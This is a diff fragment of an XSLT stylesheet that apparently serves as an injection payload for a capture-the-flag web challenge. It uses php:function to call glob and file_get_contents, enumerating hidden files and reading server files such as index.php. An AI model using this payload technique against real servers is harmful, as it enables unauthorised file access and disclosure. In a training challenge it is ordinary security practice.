@@ -30,7 +30,7 @@ xmlns:php="http://php.net/xsl"
 <xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._phpz*')" disable-output-escaping="yes"/>
 <xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._php_*')" disable-output-escaping="yes"/>
 
-<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._phpasswd')" disable-output-escaping="yes"/> 
+<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._php')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <xsl:template match="/">	
   SCANDIR0 ._phpa*:<xsl:value-of select="$shandlea"/> 
